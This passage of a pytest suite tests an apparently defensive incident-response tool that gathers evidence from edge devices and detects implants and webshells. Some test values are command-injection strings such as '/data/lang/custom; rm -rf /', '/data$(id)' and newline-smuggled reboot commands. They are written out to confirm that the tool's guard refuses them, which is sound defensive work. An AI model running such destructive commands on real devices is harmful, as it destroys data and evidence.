"""End-to-end and unit tests for edgetriage.

Run from the repository root:  python -m pytest -q tests/
"""
from __future__ import annotations

import json
import sys
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT))
sys.path.insert(0, str(ROOT / "tests"))

import make_fixtures  # noqa: E402
from edgetriage.analyze import analyze  # noqa: E402
from edgetriage.collect import CollectionRefused, collect, plan  # noqa: E402
from edgetriage.custody import Case  # noqa: E402
from edgetriage.profiles import TIER_ORDER, ProfileError, available_profiles, get_profile, load_profile  # noqa: E402
from edgetriage.report_extras import build_brief, build_timeline  # noqa: E402
from edgetriage.transport import ReplayTransport  # noqa: E402
from edgetriage.util import sha256_file  # noqa: E402


@pytest.fixture(scope="session")
def fx(tmp_path_factory) -> Path:
    out = tmp_path_factory.mktemp("fixtures")
    make_fixtures.main(out)
    return out


def run(fx: Path, tmp: Path, profile: str, fixture: str, case_id: str = "IR-TEST", **kw) -> Path:
    prof = get_profile(profile)
    case = Case(tmp / case_id)
    collect(prof, ReplayTransport(fx / fixture), case, case_id=case_id, operator="tester",
            target={"host": "192.0.2.10"}, preflight=kw.pop("preflight", {"rebooted_since_incident": "no"}),
            variables=kw.pop("variables", {}), **kw)
    return case.root


def det(findings: dict, did: str) -> dict:
    return next(r for r in findings["detections"] if r["id"] == did)


# ------------------------------------------------------------------ profiles
def test_all_profiles_load():
    names = set(available_profiles())
    assert {"panos", "fortios", "netscaler", "cisco-asa", "ivanti-ics"} <= names
    for n in names:
        get_profile(n)


def test_guard_rejects_state_changing_command(tmp_path):
    p = tmp_path / "bad.yaml"
    p.write_text(
        "profile: bad\nplatform_id: EDGE-0001\ndisplay: bad\n"
        "cli: {allow: ['show [\\w ]+', 'request [\\w ]+'], deny: ['^request ']}\n"
        "steps:\n  - {id: x, tier: V0, kind: command, cmd: 'request restart system', purpose: p}\n"
    )
    with pytest.raises(ProfileError, match="deny"):
        load_profile(p)


def test_guard_rejects_non_session_setup(tmp_path):
    p = tmp_path / "bad.yaml"
    p.write_text(
        "profile: bad\nplatform_id: EDGE-0002\ndisplay: bad\n"
        "cli: {allow: ['get [\\w ]+'], session_setup: ['config system console']}\n"
        "steps:\n  - {id: x, tier: V0, kind: command, cmd: 'get system status', purpose: p}\n"
    )
    with pytest.raises(ProfileError, match="session"):
        load_profile(p)


def test_low_confidence_step_must_be_marked_unverified(tmp_path):
    p = tmp_path / "bad.yaml"
    p.write_text(
        "profile: bad\nplatform_id: EDGE-0002\ndisplay: bad\ncli: {allow: ['get [\\w ]+']}\n"
        "steps:\n  - {id: x, tier: V0, kind: command, cmd: 'get system status', purpose: p, confidence: low}\n"
    )
    with pytest.raises(ProfileError, match="unverified"):
        load_profile(p)


@pytest.mark.parametrize("name", ["panos", "fortios", "netscaler", "cisco-asa", "ivanti-ics"])
def test_plan_follows_order_of_volatility(name):
    steps = [s for s, _ in plan(get_profile(name), True, True, {})]
    idx = [TIER_ORDER.index(s.tier) for s in steps]
    assert idx == sorted(idx)
    impacts = [s.impact for s in steps]
    if "break-glass" in impacts:
        assert impacts[-1] == "break-glass"


def test_asa_memory_check_precedes_everything_disruptive():
    ids = [s.id for s, _ in plan(get_profile("cisco-asa"), True, True, {})]
    assert ids.index("mem_region_lina") < ids.index("show_running_config") < ids.index("core_dump")


def test_bundle_and_break_glass_are_opt_in():
    prof = get_profile("panos")
    default = {s.id for s in prof.ordered()}
    assert "tsf_export" not in default and "tac_root_artifacts" not in default
    assert "tsf_export" in {s.id for s in prof.ordered(allow_bundle=True)}


# ------------------------------------------------------------------ collection / custody
def test_var_cannot_smuggle_shell_syntax(fx, tmp_path):
    # Refused before anything is typed or a case is written.
    with pytest.raises(ProfileError):
        run(fx, tmp_path, "fortios", "fortios-compromised",
            variables={"sslvpn_lang_dir": "/data/lang/custom; rm -rf /"})
    assert not (tmp_path / "IR-TEST").exists()


def test_missing_var_skips_step(fx, tmp_path):
    root = run(fx, tmp_path, "fortios", "fortios-compromised")
    m = json.loads((root / "manifest.json").read_text())
    step = next(s for s in m["steps"] if s["step_id"] == "listing_sslvpn_lang")
    assert step["status"] == "skipped" and "sslvpn_lang_dir" in step["error"]


def test_break_glass_needs_confirmation(fx, tmp_path):
    with pytest.raises(CollectionRefused):
        run(fx, tmp_path, "cisco-asa", "asa-compromised", break_glass=True, confirm=lambda _m: False)


def test_existing_case_is_never_overwritten(fx, tmp_path):
    run(fx, tmp_path, "panos", "panos-benign")
    with pytest.raises(CollectionRefused):
        run(fx, tmp_path, "panos", "panos-benign")


def test_manifest_hashes_are_true(fx, tmp_path):
    root = run(fx, tmp_path, "panos", "panos-compromised")
    m = json.loads((root / "manifest.json").read_text())
    assert m["tool_sha256"] and m["profile_sha256"]
    for s in m["steps"]:
        if s["status"] == "ok" and s.get("output"):
            assert sha256_file(root / s["output"]) == s["sha256"]
    recorded = (root / "manifest.sha256").read_text().split()[0]
    assert recorded == sha256_file(root / "manifest.json")


def test_ingest_refuses_hostile_members_and_chains_manifest(fx, tmp_path):
    root = run(fx, tmp_path, "panos", "panos-benign")
    case = Case(root)
    before = sha256_file(case.manifest_path)
    m = case.load()
    rec = case.ingest(fx / "panos-tsf.tgz", "tsf", evidence_classes=["bundle", "filesystem"])
    m["ingested"].append(rec)
    case.save(m)
    assert rec["copy_verified"]
    assert any("unsafe path" in r for r in rec["extract_rejected"])
    assert any("link -> /" in r for r in rec["extract_rejected"])
    assert not (tmp_path / "escape.txt").exists() and not (root / "escape.txt").exists()
    assert case.load()["previous_manifest_sha256"] == before


# ------------------------------------------------------------------ analysis
def test_panos_compromised(fx, tmp_path):
    root = run(fx, tmp_path, "panos", "panos-compromised")
    f = analyze(root)
    # CLI collection alone shows exploitation attempts; the cron record lives in the TSF.
    assert f["verdict"]["level"] == "SUSPICIOUS"
    assert det(f, "panos-3400-gpsvc-non-guid-session")["hit_count"] == 2
    assert det(f, "panos-3400-gpsvc-injection-payload")["hit_count"] == 1
    assert det(f, "panos-3400-crond-download-exec")["status"] == "not-evaluated"
    assert det(f, "panos-3400-upstyle-pth")["status"] == "not-evaluated"


def test_panos_tsf_ingest_finds_upstyle_and_config(fx, tmp_path):
    root = run(fx, tmp_path, "panos", "panos-benign")
    case = Case(root)
    m = case.load()
    m["ingested"].append(case.ingest(fx / "panos-tsf.tgz", "tsf"))
    case.save(m)
    f = analyze(root)
    assert det(f, "panos-3400-upstyle-pth")["status"] == "hit"
    assert det(f, "panos-3400-upstyle-yara")["status"] == "hit"
    assert det(f, "panos-3400-config-in-webroot")["status"] == "hit"
    r = det(f, "panos-3400-crond-download-exec")
    assert r["status"] == "hit" and r["hits"][0]["source"].endswith("syslog-system.log")
    assert f["verdict"]["level"] == "COMPROMISED"


def test_benign_is_never_called_clean(fx, tmp_path):
    root = run(fx, tmp_path, "panos", "panos-benign")
    f = analyze(root)
    assert f["verdict"]["level"] == "NO-INDICATORS-FOUND"
    assert "not a finding that the device is clean" in f["verdict"]["rationale"]
    kinds = {g["kind"] for g in f["evidence_gaps"]}
    assert {"detection-not-evaluated", "standing"} <= kinds
    assert "CLEAN" not in (root / "report.md").read_text().upper().replace("NOT A FINDING THAT THE DEVICE IS CLEAN", "")


def test_rebooted_device_reports_volatile_loss(fx, tmp_path):
    root = run(fx, tmp_path, "panos", "panos-benign", preflight={"rebooted_since_incident": "yes"})
    f = analyze(root)
    assert any(g["kind"] == "volatile-lost" for g in f["evidence_gaps"])


def test_netscaler_compromised(fx, tmp_path):
    root = run(fx, tmp_path, "netscaler", "netscaler-compromised")
    f = analyze(root)
    assert f["verdict"]["level"] == "COMPROMISED"
    assert "corroborated" in f["verdict"]["rationale"]
    assert det(f, "netscaler-php-writable")["hit_count"] == 1
    assert det(f, "netscaler-php-webshell-content")["hit_count"] == 1
    assert det(f, "netscaler-cron-download")["status"] == "hit"
    assert det(f, "netscaler-suid-in-tmp")["status"] == "hit"
    assert det(f, "netscaler-shell-listener")["status"] == "hit"
    nb = det(f, "netscaler-auth-nonprintable")
    assert nb["hit_count"] == 1 and "\\x00" in nb["hits"][0]["excerpt"]


def test_netscaler_benign(fx, tmp_path):
    root = run(fx, tmp_path, "netscaler", "netscaler-benign")
    f = analyze(root)
    assert f["verdict"]["level"] == "NO-INDICATORS-FOUND"
    assert det(f, "netscaler-php-webshell-content")["status"] == "no-hit"


def test_asa_line_dancer_regions(fx, tmp_path):
    root = run(fx, tmp_path, "cisco-asa", "asa-compromised")
    f = analyze(root)
    r = det(f, "asa-lina-multiple-exec-regions")
    assert r["status"] == "hit" and "0x1000" in r["hits"][0]["detail"]
    assert det(f, "asa-line-runner-zip")["status"] == "hit"
    assert det(f, "asa-zip-on-disk0")["status"] == "no-hit"   # the named bundle is excluded
    assert det(f, "asa-fxos-lina-cs-process")["status"] == "hit"
    assert det(f, "asa-firmware-update-log")["status"] == "hit"
    assert det(f, "asa-checkheaps-stalled")["status"] == "hit"
    assert det(f, "asa-20269-default-group-session")["status"] == "hit"
    # Break-glass and opt-in: not run by default, so not evaluated - never a pass.
    assert det(f, "asa-lina-text-implant-grep")["status"] == "not-evaluated"
    bg = analyze(run(fx, tmp_path, "cisco-asa", "asa-compromised", case_id="IR-TEST-BG",
                     break_glass=True, confirm=lambda _m: True))
    assert det(bg, "asa-lina-text-implant-grep")["status"] == "hit"
    assert det(f, "asa-line-runner-webcontent")["status"] == "hit"
    assert f["verdict"]["level"] == "COMPROMISED"            # memory + persistence corroborate


def test_single_likely_class_stays_likely(fx, tmp_path):
    root = run(fx, tmp_path, "fortios", "fortios-compromised",
               variables={"sslvpn_lang_dir": "/migadmin/lang"})
    f = analyze(root)
    assert f["verdict"]["level"] == "LIKELY-COMPROMISED"     # symlink only (persistence)


def test_asa_benign(fx, tmp_path):
    root = run(fx, tmp_path, "cisco-asa", "asa-benign")
    f = analyze(root)
    assert det(f, "asa-lina-multiple-exec-regions")["status"] == "no-hit"
    assert det(f, "asa-fxos-lina-cs-process")["status"] == "no-hit"
    assert det(f, "asa-checkheaps-stalled")["status"] == "no-hit"
    assert det(f, "asa-20269-default-group-session")["status"] == "no-hit"
    assert det(f, "asa-lina-text-implant-grep")["status"] == "not-evaluated"   # break-glass, opt-in
    assert det(f, "asa-line-runner-webcontent")["status"] == "no-hit"
    assert f["verdict"]["level"] == "NO-INDICATORS-FOUND"


def test_asa_line_dancer_detail_does_not_excuse_extra_exec_regions(fx, tmp_path):
    """NCSC's '2 or 5' counts lina regions of all permissions; it is not a normal
    range for r-xp regions, and the hit detail must not tell the analyst it is."""
    f = analyze(run(fx, tmp_path, "cisco-asa", "asa-compromised"))
    detail = det(f, "asa-lina-multiple-exec-regions")["hits"][0]["detail"]
    assert "can be normal" not in detail and "all permissions" in detail


def test_asa_cisa_implant_grep_is_exact_and_ignores_the_echo(fx, tmp_path):
    """Only CISA's exact command is admitted, and an echoed command line (which
    carries the same hex groups) is not a hit."""
    p = get_profile("cisco-asa")
    p.check_command("more /binary system:/text | grep 55534154 41554156 41575756 488bb3a0")
    for bad in ("more /binary system:/text", "more /binary system:/text | grep 41",
                "more disk0:/asa.cfg", "more /binary system:/text | grep 55534154 41554156 41575756 488bb3a0 | redirect disk0:/x"):
        with pytest.raises(Exception):
            p.check_command(bad)
    ids = [s.id for s in p.ordered(break_glass=True)]
    live = [s.id for s in p.steps if s.tier.startswith("V") and s.id != "lina_text_implant_grep"]
    assert all(ids.index(i) < ids.index("lina_text_implant_grep") for i in live)   # after every other live step
    assert ids.index("lina_text_implant_grep") < ids.index("core_dump")
    assert next(s for s in p.steps if s.id == "lina_text_implant_grep").impact == "break-glass"
    assert "lina_text_implant_grep" not in [s.id for s in p.ordered(break_glass=False)]   # never by default
    import shutil
    from edgetriage.util import slugify
    rp = tmp_path / "echo"
    shutil.copytree(fx / "asa-benign", rp)
    cmd = "more /binary system:/text | grep 55534154 41554156 41575756 488bb3a0"
    (rp / "commands" / (slugify(cmd) + ".txt")).write_text("fw-asa-lab# " + cmd + "\n")
    case = Case(tmp_path / "IR-ECHO")
    collect(p, ReplayTransport(rp), case, case_id="IR-ECHO", operator="t",
            target={"host": "192.0.2.10"}, preflight={}, variables={}, break_glass=True, confirm=lambda _m: True)
    assert det(analyze(case.root), "asa-lina-text-implant-grep")["status"] == "no-hit"


def test_asa_checkheaps_needs_time_and_a_counter():
    from edgetriage.checks.cisco import asa_checkheaps_stalled

    class V:
        def __init__(self, a, b): self.t = {"show_checkheaps": a, "show_checkheaps_late": b}
        def step_text(self, s): return self.t.get(s)
    ch = lambda e, r: f"Time elapsed since last run      : {e} secs\nTotal number of runs             : {r}\n"
    assert asa_checkheaps_stalled(V(ch(10, 5), ch(40, 5)), {}) == (False, [])   # under a minute: not evaluated
    assert asa_checkheaps_stalled(V("% Invalid input", ch(90, 5)), {}) == (False, [])  # no counter parsed
    assert asa_checkheaps_stalled(V(ch(10, 5), ch(3, 6)), {}) == (True, [])     # moved: evaluated, clean
    ok, hits = asa_checkheaps_stalled(V(ch(10, 5), ch(75, 5)), {})
    assert ok and hits and hits[0].extra["runs_last"] == 5
    assert "five minutes" in hits[0].detail                                     # no step times: gap unknown

    class T(V):   # with manifest step times: CISA's five-minute wait is reported
        def __init__(self, a, b, gap):
            super().__init__(a, b)
            self.s = {"show_checkheaps": {"started_utc": "2026-10-22T14:00:00.000Z"},
                      "show_checkheaps_late": {"started_utc": f"2026-10-22T14:{gap // 60:02d}:{gap % 60:02d}.000Z"}}
        def step(self, s): return self.s.get(s)
    _, hits = asa_checkheaps_stalled(T(ch(10, 5), ch(75, 5), 90), {})
    assert hits[0].extra["reading_gap_s"] == 90 and "repeat by hand" in hits[0].detail
    _, hits = asa_checkheaps_stalled(T(ch(10, 5), ch(320, 5), 330), {})
    assert "meeting CISA's five-minute wait" in hits[0].detail


def test_fortios_baseline_is_required_and_used(fx, tmp_path):
    root = run(fx, tmp_path, "fortios", "fortios-compromised",
               variables={"sslvpn_lang_dir": "/migadmin/lang"})
    f = analyze(root)
    assert det(f, "fortios-fs-hash-baseline")["status"] == "not-evaluated"
    assert det(f, "fortios-symlink-root")["status"] == "hit"
    assert det(f, "fortios-crashlog-sslvpnd-segv")["status"] == "hit"
    # The event-log regex no longer claims the crash log: without a log export it is not evaluated.
    assert det(f, "fortios-sslvpnd-crash")["status"] == "not-evaluated"
    # New listings were collected and are clean in this fixture: evaluated, no hit.
    for d in ("fortios-42475-ioc-files", "fortios-coathanger-smartctl", "fortios-coathanger-httpsd-socket",
              "fortios-coathanger-preload-map", "fortios-41328-lspci-symlink", "fortios-41328-castletap-fgfm"):
        assert det(f, d)["status"] == "no-hit", d
    baseline = json.loads((fx / "fortios-baseline.json").read_text())
    f = analyze(root, baseline=baseline)
    r = det(f, "fortios-fs-hash-baseline")
    assert r["hit_count"] == 1 and r["hits"][0]["tier"] == "likely"
    assert "/bin/sslvpnd" in r["hits"][0]["detail"]


def test_ivanti_profile_is_all_manual(fx, tmp_path):
    (tmp_path / "empty" / "commands").mkdir(parents=True)
    prof = get_profile("ivanti-ics")
    case = Case(tmp_path / "IV-1")
    m = collect(prof, ReplayTransport(tmp_path / "empty"), case, case_id="IV-1", operator="t",
                target={"host": "192.0.2.30"}, preflight={}, variables={})
    assert {s["status"] for s in m["steps"]} == {"pending-manual"}
    f = analyze(case.root)
    assert sum(g["kind"] == "manual-step-pending" for g in f["evidence_gaps"]) == len(m["steps"])


# ------------------------------------------------------------------ outputs
def test_timeline_and_brief(fx, tmp_path):
    root = run(fx, tmp_path, "panos", "panos-compromised")
    analyze(root)
    rows = build_timeline(root)
    assert any(r["kind"].startswith("finding:") for r in rows)
    assert [r["ts"] for r in rows] == sorted(r["ts"] for r in rows)
    brief = build_brief(root).read_text()
    assert "Do not raise or lower it" in brief and '"rid": "R001"' in brief
    assert (root / "brief_records.jsonl").stat().st_size > 0


def test_yara_webshell_rule(fx):
    yara = pytest.importorskip("yara")
    rules = yara.compile(filepath=str(ROOT / "04-citrix-netscaler" / "php_webshell_generic.yar"))
    assert rules.match(str(fx / "shell.php"))
    assert not rules.match(str(fx / "benign.php"))


# ------------------------------------------------------------------ SSH transport (no network)
class FakeChannel:
    """Scripted PTY: replies to each sent command with canned chunks."""

    def __init__(self, script):
        self.script, self.pending, self.sent = script, [], []

    def send(self, data):
        self.sent.append(data)
        self.pending.extend(self.script.get(data, []))

    def recv_ready(self):
        return bool(self.pending)

    def recv(self, _n):
        return self.pending.pop(0).encode()


def test_ssh_transport_handles_pager_echo_and_ansi():
    from edgetriage.transport import SSHTransport
    t = SSHTransport("192.0.2.10", "ir-ro", prompt=r"fw-lab-01> ?$", pager="--More--")
    t.chan = FakeChannel({
        "show system info\n": ["show system info\r\n", "\x1b[0mhostname: fw-lab-01\r\n--More--"],
        " ": ["sw-version: 10.2.9\r\nfw-lab-01> "],
    })
    out = t.run("show system info", timeout=5)
    assert out == "hostname: fw-lab-01\nsw-version: 10.2.9\n"
    assert t.chan.sent == ["show system info\n", " "]


# ------------------------------------------------------------------ guard regressions (independent review, 2026-10-22)
@pytest.mark.parametrize("profile,cmd", [
    ("panos", "show clock\nrequest restart system"),
    ("panos", "show clock\rrequest restart system"),
    ("fortios", "get system status\nexecute reboot"),
    ("netscaler", "show ns version\nshell rm -rf /var/log"),
    ("netscaler", "shell find /var/tmp\nreboot -warm"),
    ("netscaler", "shell find /var/tmp -de''lete"),
    ("netscaler", "shell find /var/tmp -ex'e'c rm -f {} +"),
    ("netscaler", "shell find /var/tmp -de\\lete"),
    ("netscaler", "shell find /var/tmp -fprint0 /var/x"),
    ("netscaler", "show techsupport"),
    ("cisco-asa", "show clock | redirect disk0:/x"),
    ("cisco-asa", "show clock\nreload noconfirm"),
])
def test_guard_refuses_smuggled_commands(profile, cmd):
    with pytest.raises(ProfileError):
        get_profile(profile).check_command(cmd)


def test_multiline_cmd_in_profile_is_refused(tmp_path):
    p = tmp_path / "bad.yaml"
    p.write_text("profile: bad\nplatform_id: EDGE-0001\ndisplay: bad\ncli: {allow: ['show [\\w -]+']}\n"
                 "steps:\n  - id: x\n    tier: V0\n    kind: command\n    purpose: p\n    cmd: |\n      show clock\n      write erase\n")
    with pytest.raises(ProfileError, match="control character"):
        load_profile(p)


def test_session_setup_newline_is_refused(tmp_path):
    p = tmp_path / "bad.yaml"
    p.write_text("profile: bad\nplatform_id: EDGE-0005\ndisplay: bad\n"
                 "cli: {allow: ['show [\\w -]+'], session_setup: [\"terminal pager 0\\nreload noconfirm\"]}\n"
                 "steps:\n  - {id: x, tier: V0, kind: command, cmd: 'show clock', purpose: p}\n")
    with pytest.raises(ProfileError):
        load_profile(p)


@pytest.mark.parametrize("value", ["u@h:/x\nrequest restart system", "/data;reboot", "/data$(id)", "/data/ x"])
def test_var_values_are_constrained_for_every_impact(fx, tmp_path, value):
    with pytest.raises(ProfileError):
        run(fx, tmp_path, "panos", "panos-benign", variables={"bundle_dest": value}, allow_bundle=True)


def test_shipped_commands_still_pass():
    for name in available_profiles():
        prof = get_profile(name)
        for s in prof.steps:
            if s.impact == "none":
                for c in (s.cmd, s.list_cmd):
                    if c:
                        prof.check_command(c.format(**{v: s.var_examples.get(v, "/data/lang/custom")
                                                       for v in s.requires_vars}))


def test_forged_listing_lines_are_not_fetched(fx, tmp_path):
    import shutil
    rp = tmp_path / "replay"
    shutil.copytree(fx / "netscaler-compromised", rp)
    from edgetriage.util import slugify
    listing = rp / "commands" / (slugify("shell find /var/netscaler/logon /var/vpn /netscaler/ns_gui /var/netscaler/ns_gui -type f -name '*.php'") + ".txt")
    listing.write_text(listing.read_text() + "/dev/zero\n/var/netscaler/logon/a b.php\n")
    root = run(fx, tmp_path, "netscaler", "netscaler-compromised")  # warm-up with clean fixture
    m = json.loads((root / "manifest.json").read_text())
    case = Case(tmp_path / "IR-FORGED")
    collect(get_profile("netscaler"), ReplayTransport(rp), case, case_id="IR-FORGED", operator="t",
            target={"host": "192.0.2.20"}, preflight={}, variables={})
    m = case.load()
    step = next(s for s in m["steps"] if s["step_id"] == "fetch_php")
    refused = {f["remote"] for f in step["files"] if f.get("error", "").startswith("refused")}
    assert "/dev/zero" in refused and "/var/netscaler/logon/a b.php" in refused


def test_prompt_lookalike_inside_output_does_not_end_capture():
    from edgetriage.transport import SSHTransport
    t = SSHTransport("192.0.2.10", "ir-ro", prompt=r"fw-lab-01> ?$", pager="--More--")
    t.QUIET = 0.05
    t.chan = FakeChannel({
        "tail lines 5 mp-log gpsvc.log\n": [
            "tail lines 5 mp-log gpsvc.log\r\n",
            "line one says fw-lab-01> but is data\r\nline two mentions --More-- mid-line\r\n",
            "line three\r\nfw-lab-01> "],
    })
    out = t.run("tail lines 5 mp-log gpsvc.log", timeout=5)
    assert "line three" in out and "--More-- mid-line" in out and t.chan.sent == ["tail lines 5 mp-log gpsvc.log\n"]


def test_ingest_label_and_duplicate_members(fx, tmp_path):
    import io
    import tarfile
    root = run(fx, tmp_path, "panos", "panos-benign")
    case = Case(root)
    with pytest.raises(ValueError):
        case.ingest(fx / "panos-tsf.tgz", "../..")
    tgz = tmp_path / "dupes.tgz"
    with tarfile.open(tgz, "w:gz") as tf:
        for name, data in [("a/x.log", b"first"), ("a/x.log", b"second"), ("a/x.log/y", b"clash"), ("C:evil", b"d")]:
            info = tarfile.TarInfo(name)
            info.size = len(data)
            tf.addfile(info, io.BytesIO(data))
    rec = case.ingest(tgz, "dupes")
    assert (root / rec["extracted_to"] / "a" / "x.log").read_bytes() == b"first"
    joined = " | ".join(rec["extract_rejected"])
    assert "duplicate" in joined and "clashes" in joined and "C:evil" in joined


# ------------------------------------------------------------------ claim-verification regressions (2026-10-22)
def test_asa_region_parser_matches_published_format():
    """Pin the real `show memory region` row from the Talos ArcaneDoor example.

    An earlier parser expected a 0x-prefixed length column that no ASA prints,
    so it matched nothing and reported 'no hit' on a compromised device. This
    test fails if the parser ever drifts away from the published format again.
    """
    from edgetriage.checks.cisco import _REGION
    published = "561d9fee9000-561d9feea000 r-xp 02696000 00:02 5955    /asa/bin/lina"
    m = _REGION.match(published)
    assert m is not None, "parser no longer matches the published ASA row format"
    assert m.group("perms") == "r-xp"
    assert int(m.group("end"), 16) - int(m.group("start"), 16) == 0x1000
    # The invented layout the old parser wanted must NOT be what we depend on.
    assert _REGION.match("0x000055d3e5c00000 0x000055d3e9a77000 0x0000000003e77000 r-xp 0 1234 /asa/bin/lina") is None


def test_line_runner_matches_variant_bundle_names():
    """The ASA loader accepts client_bundle*.zip, so the detection must too."""
    import re
    import yaml
    pack = yaml.safe_load((ROOT / "artifacts/packs/EDGE-PACK-0006-cisco-asa-arcanedoor.yml").read_text())
    pat = next(d["pattern"] for d in pack["detect"] if d["id"] == "asa-line-runner-zip")
    for name in ("client_bundle_install.zip", "client_bundle_x.zip", "client_bundle.zip"):
        assert re.search(pat, name, re.I), name


def test_every_implant_without_coverage_states_a_gap():
    """A coverage hole must be visible: no detections means a written gap."""
    import yaml
    for p in (ROOT / "artifacts/intel/implants").glob("*.yml"):
        doc = yaml.safe_load(p.read_text())
        assert doc.get("detections") or doc.get("gap"), p.name


# ------------------------------------------------------------------ new platforms (2026-10-22)
IOSXE_PKG = "bootflash:isr4400-mono-universalk9.17.09.04a.SPA.pkg"
NEW_PLATFORMS = [("junos", "junos", {}), ("cisco-iosxe", "iosxe", {"boot_image": IOSXE_PKG}),
                 ("f5-bigip", "f5", {}), ("checkpoint-gaia", "checkpoint", {})]


@pytest.mark.parametrize("profile,fixture,var", NEW_PLATFORMS)
def test_new_platform_benign_is_not_called_clean(fx, tmp_path, profile, fixture, var):
    root = run(fx, tmp_path, profile, f"{fixture}-benign", variables=var)
    f = analyze(root)
    assert f["verdict"]["level"] == "NO-INDICATORS-FOUND"
    assert not [r for r in f["detections"] if r["status"] == "hit"]


@pytest.mark.parametrize("profile,fixture,var,expected", [
    ("junos", "junos", {}, "COMPROMISED"),
    ("cisco-iosxe", "iosxe", {"boot_image": IOSXE_PKG}, "COMPROMISED"),
    ("f5-bigip", "f5", {}, "COMPROMISED"),
    ("checkpoint-gaia", "checkpoint", {}, "LIKELY-COMPROMISED"),
])
def test_new_platform_compromised_verdict(fx, tmp_path, profile, fixture, var, expected):
    root = run(fx, tmp_path, profile, f"{fixture}-compromised", variables=var)
    assert analyze(root)["verdict"]["level"] == expected


def test_junos_masquerade_matches_exact_names_only(fx, tmp_path):
    f = analyze(run(fx, tmp_path, "junos", "junos-compromised"))
    names = {h["excerpt"].split()[-1] for h in det(f, "junos-unc3886-masquerade-proc")["hits"]}
    assert names == {"appid", "to"}            # appidd and jddosd in the same listing must not match
    assert det(f, "junos-login-record-backups")["hit_count"] == 2
    assert det(f, "junos-unc3886-tinyshell-yara")["status"] == "not-evaluated"   # no binaries via CLI


def test_junos_listing_type_markers_do_not_hide_files(fx, tmp_path):
    """Junos `file list` appends * and | markers; a pattern anchored on the bare name saw nothing."""
    f = analyze(run(fx, tmp_path, "junos", "junos-compromised"))
    assert det(f, "junos-unc3886-payload-files")["hit_count"] == 2      # ldb.b64 and loader.bin*
    assert det(f, "junos-unc3886-null-fifo")["hit_count"] == 1          # null|
    assert det(f, "junos-syslog-conf-backup")["hit_count"] == 1
    assert det(f, "junos-hijacked-cat-process")["hit_count"] == 1
    assert det(f, "junos-jweb-hex-named-upload")["hit_count"] == 1     # J-Web upload shape in the jail
    assert det(f, "junos-jweb-php-log-anonymous")["status"] == "not-evaluated"  # php.log not ingested


def test_junos_integrity_check_is_not_impact_free():
    """JMRT integrity-check produces syslog lines (Juniper: "MAC/veriexec: no fingerprint
    (file=/tmp/veriexec_test"); that it writes a test file is the toolkit's inference. Opt-in."""
    p = get_profile("junos")
    step = next(s for s in p.steps if s.id == "jmrt_integrity_check")
    assert step.impact == "vendor-bundle"
    with pytest.raises(Exception):
        p.check_command("request system malware-scan integrity-check")


def test_iosxe_rwx_dirty_threshold_and_not_evaluated(fx, tmp_path):
    f = analyze(run(fx, tmp_path, "cisco-iosxe", "iosxe-compromised", variables={"boot_image": IOSXE_PKG}))
    r = det(f, "iosxe-iosd-rwx-dirty")
    assert r["hit_count"] == 1 and "12 kB" in r["hits"][0]["detail"]   # rw-p with dirty pages is normal, not a hit
    # An error instead of smaps must be 'not evaluated', never 'no hit'.
    import shutil
    from edgetriage.util import slugify
    rp = tmp_path / "err"
    shutil.copytree(fx / "iosxe-benign", rp)
    (rp / "commands" / (slugify("show platform software process memory rp active name iosd smaps") + ".txt")).write_text(
        "% Invalid input detected at '^' marker.\n")
    case = Case(tmp_path / "IR-ERR")
    collect(get_profile("cisco-iosxe"), ReplayTransport(rp), case, case_id="IR-ERR", operator="t",
            target={"host": "192.0.2.10"}, preflight={}, variables={"boot_image": IOSXE_PKG})
    assert det(analyze(case.root), "iosxe-iosd-rwx-dirty")["status"] == "not-evaluated"


def test_iosxe_switch_form_smaps_is_read(fx, tmp_path):
    """Catalyst switches need the `switch active rp active` form; the router form errors there."""
    import shutil
    from edgetriage.util import slugify
    rp = tmp_path / "sw"
    shutil.copytree(fx / "iosxe-compromised", rp)
    router = rp / "commands" / (slugify("show platform software process memory rp active name iosd smaps") + ".txt")
    switch = rp / "commands" / (slugify("show platform software process memory switch active rp active name iosd smaps") + ".txt")
    switch.write_text(router.read_text())
    router.write_text("% Invalid input detected at '^' marker.\n")
    case = Case(tmp_path / "IR-SW")
    collect(get_profile("cisco-iosxe"), ReplayTransport(rp), case, case_id="IR-SW", operator="t",
            target={"host": "192.0.2.10"}, preflight={}, variables={"boot_image": IOSXE_PKG})
    r = det(analyze(case.root), "iosxe-iosd-rwx-dirty")
    assert r["hit_count"] == 1 and r["hits"][0]["source"] == "step:iosd_smaps_switch"


def test_iosxe_r0_switch_form_and_dirty_rx_segments(fx, tmp_path):
    """Cisco's guide: some switches need r0 for rp. And its procedure checks every
    executable segment (r-xp or rwxp); dirty r-xp is reported separately at possible."""
    import shutil
    from edgetriage.util import slugify
    from make_fixtures import _smaps
    rp = tmp_path / "r0"
    shutil.copytree(fx / "iosxe-benign", rp)
    err = "% Invalid input detected at '^' marker.\n"
    for c in ("show platform software process memory rp active name iosd smaps",
              "show platform software process memory switch active rp active name iosd smaps"):
        (rp / "commands" / (slugify(c) + ".txt")).write_text(err)
    (rp / "commands" / (slugify("show platform software process memory switch active r0 active name iosd smaps") + ".txt")).write_text(
        _smaps([("55d6c4a00000-55d6c5000000", "r-xp", 8), ("55d6c5400000-55d6c5600000", "rwxp", 0)]))
    case = Case(tmp_path / "IR-R0")
    collect(get_profile("cisco-iosxe"), ReplayTransport(rp), case, case_id="IR-R0", operator="t",
            target={"host": "192.0.2.10"}, preflight={}, variables={"boot_image": IOSXE_PKG})
    f = analyze(case.root)
    assert det(f, "iosxe-iosd-rwx-dirty")["status"] == "no-hit"           # evaluated from the r0 form
    r = det(f, "iosxe-iosd-rx-dirty")
    assert r["hit_count"] == 1 and r["hits"][0]["tier"] == "possible"
    assert r["hits"][0]["source"] == "step:iosd_smaps_switch_r0"


def test_iosxe_weblogin_and_pcap_names(fx, tmp_path):
    f = analyze(run(fx, tmp_path, "cisco-iosxe", "iosxe-compromised", variables={"boot_image": IOSXE_PKG}))
    assert det(f, "iosxe-weblogin-talos-user")["status"] == "hit"
    assert det(f, "iosxe-named-pcap-on-flash")["status"] == "hit"        # tac.pcap, likely
    assert det(f, "iosxe-1-pcap-on-flash")["status"] == "no-hit"
    b = analyze(run(fx, tmp_path, "cisco-iosxe", "iosxe-benign", case_id="IR-B", variables={"boot_image": IOSXE_PKG}))
    assert det(b, "iosxe-weblogin-talos-user")["status"] == "no-hit"
    assert det(b, "iosxe-iosd-rx-dirty")["status"] == "no-hit"


def test_iosxe_packages_conf_readable_but_not_writable():
